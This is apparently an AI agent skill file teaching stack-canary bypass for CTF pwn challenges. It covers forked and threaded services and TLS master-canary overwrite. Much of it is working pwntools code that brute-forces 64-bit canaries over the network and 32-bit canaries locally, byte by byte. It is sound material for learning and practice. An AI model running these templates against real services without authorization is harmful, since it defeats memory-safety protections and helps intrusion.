---
name: binary-exploitation-stack-canary-bypass
description: How to bypass stack canary protections in binary exploitation. Use this skill whenever the user mentions stack canaries, ASLR bypass, binary exploitation, pwn challenges, forked processes, threaded binaries, or needs to brute-force security tokens. This skill covers brute-forcing canaries on forked network services, threaded processes, and TLS-based canary manipulation. Make sure to use this skill for any CTF pwn challenge, binary analysis, or exploitation task involving stack canaries, even if the user doesn't explicitly mention "canary" or "stack protection."
---

# Stack Canary Bypass Techniques

This skill helps you bypass stack canary protections in binary exploitation scenarios. Stack canaries are security tokens placed on the stack to detect buffer overflows before they can corrupt the return address.

## When Canary Bypass is Possible

### Forked Processes (Network Services)

**Best case scenario**: The binary forks a child process for each connection. Every connection gets the **same canary value**, making brute-force feasible.

**How to detect**:
- Network service that spawns per-connection
- Same canary reused across connections
- `checksec` might miss statically compiled binaries - look for canary save/check patterns in disassembly

### Threaded Processes

Threads share the same canary token from the parent process. If the binary spawns a new thread per attack, you can brute-force the canary.

**Advanced**: Buffer overflow in a threaded function can modify the master canary in TLS (Thread Local Storage), making the check useless since both canaries match (even if modified).

## Brute-Force Canary Method

The core technique: **guess one byte at a time**, checking if the program crashes or continues normally.

### Detection Methods

1. **Response-based**: Check if server sends expected output (correct byte) vs crashes (wrong byte)
2. **Try/except**: Catch connection errors when canary check fails
3. **Timing**: Correct bytes may have different response times

### 64-bit Brute-Force Template

```python
from pwn import *

def brute_force_canary_64(target_host, target_port, offset, trigger_marker):
    """
    Brute-force 8-byte canary on forked network service
    
    Args:
        target_host: Hostname or IP
        target_port: Port number
        offset: Bytes to fill before canary
        trigger_marker: String that appears when canary is correct
    """
    canary = b""
    base = b"A" * offset
    
    for byte_pos in range(8):
        for guess in range(256):
            try:
                r = remote(target_host, target_port)
                
                # Send payload with current guess
                payload = base + canary + bytes([guess])
                r.send(payload)
                
                # Check if canary was correct
                response = r.recv()
                if trigger_marker.encode() in response:
                    print(f"Byte {byte_pos}: 0x{guess:02x}")
                    canary += bytes([guess])
                    break
                else:
                    r.close()
            except:
                r.close()
    
    return canary

# Usage
CANARY = brute_force_canary_64("localhost", 8788, 1176, "SOME OUTPUT")
print(f"Canary: {CANARY.hex()}")
```

### 32-bit Brute-Force Template

```python
from pwn import *

def brute_force_canary_32(binary_path, offset, trigger_marker):
    """
    Brute-force 4-byte canary on local process
    
    Args:
        binary_path: Path to target binary
        offset: Bytes to fill before canary
        trigger_marker: String that appears when canary is correct
    """
    known_canary = b""
    
    for byte_pos in range(4):
        for guess in range(256):
            target = process(binary_path)
            
            # Send payload with current guess
            payload = b"A" * offset + known_canary + bytes([guess])
            target.send(payload)
            
            # Check if canary was correct
            output = target.recvuntil(b"exit.", timeout=2)
            if trigger_marker.encode() in output:
                print(f"Byte {byte_pos}: 0x{guess:02x}")
                known_canary += bytes([guess])
                break
            
            target.close()
    
    return known_canary

# Usage
canary = brute_force_canary_32("./feedme", 0x20, "YUM")
log.info(f"Canary: {canary.hex()}")
```

## TLS Canary Manipulation (Advanced)

When threads are involved, the canary is stored in TLS (Thread Local Storage), typically allocated via `mmap`. A buffer overflow in a thread's stack can potentially reach and modify the TLS canary.

**Key insight**: If you can overflow into TLS and modify the master canary, the check becomes useless because both the stack canary and TLS canary will match (even though both are wrong).

**Requirements**:
- Threaded binary
- Buffer overflow in thread function
- Reachable TLS memory from thread stack

## Common Patterns

### Network Service (Forked)
```python
# Connect, send, check response, repeat per byte
for byte in range(8):
    for guess in range(256):
        r = remote(host, port)
        r.send(payload + guess)
        if "success" in r.recv():
            canary += guess
            break
```

### Local Process
```python
# Spawn process, send, check output, repeat per byte
for byte in range(4):  # 32-bit
    for guess in range(256):
        p = process("./binary")
        p.send(payload + guess)
        if "success" in p.recv():
            canary += guess
            break
```

## Debugging Tips

1. **Verify canary protection**: Look for `__stack_chk_fail` in binary or canary save/check in disassembly
2. **Check for PIE**: If PIE is enabled, you'll need to leak addresses first
3. **Test connection**: Ensure your detection method works before brute-forcing
4. **Rate limiting**: Add delays if the service rate-limits connections
5. **Timeout handling**: Set appropriate timeouts to detect crashes vs slow responses

## References

- [DCQuals16 Feedme Writeup](https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html)
- [HTB Robot Factory Canary Bypass](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
- [Master Canary Forging Presentation](https://www.slideshare.net/codeblue_jp/master-canary-forging-by-yuki-koike-code-blue-2015)

## Next Steps

After bypassing the canary:
1. **Check other protections**: NX, PIE, RELRO
2. **Plan ROP chain**: If NX is enabled, you'll need ROP gadgets
3. **Address leaks**: If PIE is enabled, leak addresses first
4. **Final payload**: Combine canary bypass with your actual exploit
